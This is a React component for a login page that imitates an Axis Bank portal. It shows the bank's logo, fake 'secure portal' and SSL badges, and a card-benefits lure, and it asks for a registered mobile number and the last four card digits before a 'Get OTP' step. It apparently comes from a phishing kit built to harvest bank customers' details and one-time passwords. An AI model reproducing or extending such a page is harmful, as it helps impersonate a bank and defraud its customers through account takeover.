/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { Phone, CreditCard, ArrowLeft, ShieldCheck } from 'lucide-react';
import { ServiceInfo, LoginData } from '../types';
import { AxisLogoIcon } from './AxisLogo';
// @ts-ignore
import defaultLogoImage from '../../images/myindierf.jpg';

interface LoginPageProps {
  service: ServiceInfo;
  onSubmit: (data: LoginData) => void;
  initialData: LoginData;
  onBack?: () => void;
}

export default function LoginPage({
  service,
  onSubmit,
  initialData,
  onBack,
}: LoginPageProps) {
  useEffect(() => {
    window.scrollTo(0, 0);
    if (document.documentElement) document.documentElement.scrollTop = 0;
    if (document.body) document.body.scrollTop = 0;
    const container = document.getElementById('app-root-container');
    if (container) container.scrollTop = 0;
  }, []);

  const [mobileNumber, setMobileNumber] = useState(initialData.mobileNumber || '');
  const [lastFourCard, setLastFourCard] = useState(initialData.lastFourCard || '');
  const [error, setError] = useState<string | null>(null);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!mobileNumber.trim() || mobileNumber.replace(/\D/g, '').length < 10) {
      setError('Please enter a valid 10-digit registered mobile number');
      return;
    }
    if (!lastFourCard.trim() || lastFourCard.replace(/\D/g, '').length !== 4) {
      setError('Please enter the last 4 digits of your card number');
      return;
    }
    setError(null);
    onSubmit({
      mobileNumber: mobileNumber.replace(/\D/g, ''),
      lastFourCard: lastFourCard.replace(/\D/g, ''),
    });
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-4" id="login-view">
      {onBack && (
        <button
          type="button"
          onClick={onBack}
          className="flex items-center gap-1.5 text-rose-800 hover:text-rose-950 font-bold text-sm mb-4 transition-all group cursor-pointer focus:outline-none rounded-lg px-2 py-1 -ml-2"
          id="login-back-btn"
        >
          <ArrowLeft className="w-5 h-5 transition-transform group-hover:-translate-x-0.5" />
          <span>Back to Services</span>
        </button>
      )}

        {/* Welcome Banner */}
      <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 mb-6 space-y-4 relative overflow-hidden">
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-[#8B0000] rounded-t-3xl" />
        <div className="flex justify-between items-center">
          <div className="flex items-center gap-3">
            <img src={defaultLogoImage} alt="Axis Bank" className="h-10 max-w-[140px] object-contain rounded-md" />
          </div>
          <div className="flex items-center gap-1.5 text-[10px] md:text-xs text-emerald-600 bg-emerald-50 border border-emerald-100 px-3 py-1 rounded-full font-bold tracking-wide uppercase">
            <ShieldCheck className="w-3.5 h-3.5" />
            <span>SECURE PORTAL</span>
          </div>
        </div>

        <div className="flex flex-col md:flex-row items-center justify-between gap-4 pt-2">
          <div className="space-y-1.5 flex-1">
            <h1 className="text-2xl md:text-3xl font-extrabold text-gray-900 tracking-tight">
              Welcome
            </h1>
            <p className="text-xs md:text-sm text-gray-600 leading-relaxed font-medium">
              Setup your Card and manage your transaction preferences & limits to enjoy incredible benefits! ({service.title})
            </p>
          </div>
          <div className="w-full md:w-auto flex justify-center">
            <img src="/welcome_image.jpeg" alt="Welcome Illustration" className="max-h-36 w-auto object-contain" />
          </div>
        </div>
      </div>

      {/* Login Card Form */}
      <form onSubmit={handleSubmit} className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 md:p-8 space-y-6">
        <div className="text-center space-y-1 pb-2">
          <h2 className="text-2xl font-extrabold text-gray-900 tracking-tight">
            Login
          </h2>
          <p className="text-xs text-gray-400 font-semibold">
            Enter your credentials to securely proceed
          </p>
        </div>

        {error && (
          <div className="p-3 rounded-2xl bg-red-50 border border-red-100 text-red-600 text-xs font-bold text-center">
            {error}
          </div>
        )}

        <div className="space-y-5">
          {/* Mobile Number */}
          <div className="space-y-1.5 text-left">
            <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="mobileNumber">
              Enter your Registered mobile number
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
                <Phone className="w-5 h-5" />
              </div>
              <input
                type="tel"
                id="mobileNumber"
                maxLength={10}
                value={mobileNumber}
                onChange={(e) => setMobileNumber(e.target.value.replace(/\D/g, ''))}
                placeholder="Enter your Registered mobile number"
                className="block w-full pl-11 pr-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-medium placeholder-gray-400 outline-none transition-all text-gray-800"
              />
            </div>
          </div>

          {/* Last 4 digits of card */}
          <div className="space-y-1.5 text-left">
            <label className="block text-xs md:text-sm font-bold text-gray-700" htmlFor="lastFourCard">
              Enter last 4 digits of your card number
            </label>
            <div className="relative">
              <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-gray-400">
                <CreditCard className="w-5 h-5" />
              </div>
              <input
                type="password"
                id="lastFourCard"
                maxLength={4}
                value={lastFourCard}
                onChange={(e) => setLastFourCard(e.target.value.replace(/\D/g, ''))}
                placeholder="Enter last 4 digits of your card number"
                className="block w-full pl-11 pr-4 py-3.5 bg-white border border-gray-200 focus:border-[#8B0000] focus:ring-4 focus:ring-rose-200 rounded-2xl text-base font-medium placeholder-gray-400 outline-none transition-all text-gray-800"
              />
            </div>
          </div>
        </div>

        {/* Submit Button */}
        <div className="pt-2">
          <button
            type="submit"
            className="w-full bg-[#8B0000] hover:bg-[#720000] active:bg-[#5A0000] active:scale-[0.98] text-white py-4 px-6 rounded-2xl font-bold tracking-wide transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer touch-manipulation select-none text-base"
            id="btn-get-otp"
          >
            Get OTP
          </button>
        </div>

        <div className="flex items-center justify-center gap-1.5 text-emerald-600 font-bold text-xs pt-1">
          <ShieldCheck className="w-4 h-4" />
          <span>256-bit SSL Encrypted Connection</span>
        </div>
      </form>
    </div>
  );
}
